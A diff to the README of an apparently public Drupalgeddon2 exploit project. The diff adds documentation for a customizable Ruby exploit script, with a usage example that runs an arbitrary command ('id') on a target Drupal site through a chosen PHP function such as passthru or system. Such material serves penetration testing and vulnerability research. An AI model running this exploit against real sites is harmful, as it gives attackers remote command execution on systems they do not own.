@@ -13,8 +13,9 @@ Authors:
 - [Hans Topo](https://github.com/dreadlocked)  _([@\_dreadlocked](https://twitter.com/_dreadlocked))_
 - [g0tmi1k](https://blog.g0tmi1k.com/) _([@g0tmi1k](https://twitter.com/g0tmi1k))_
 
-
-Ey! Before opening an issue, please, read the throubleshooting section at the end of this readme. Thanks!
+Notes:
+- For a customizable exploit, read "drupalgeddon2-not-write-shell.rb" section.
+- Ey! Before opening an issue, please, read the throubleshooting section at the end of this readme. Thanks!
 
 - - -
 
@@ -115,6 +116,24 @@ proxy_addr = '192.168.0.130'
 proxy_port = 8080
 ```
 
+
+- - -
+#### Experimental but usable: drupalgeddon2-not-write-shell.rb
+
+This exploit is inteded to be more customizable. It allows you to specify some more parameters as the PHP method to use (not only system or passthru) and the way to reach user/password form.
+
+Usage examples:
+
+```
+$ ruby drupalgeddon2-not-write-shell.rb https://example.com 7 id passthru 0
+
+1st parameter: Target URL
+2nd parameter: Drupal version
+3rd parameter: Command
+4th parameter: PHP method to use (passthru, exec, system, assert...)
+5th parameter: 0 for "/?q=user/password", 1 for "/user/password"
+
+```
 
 - - -
 
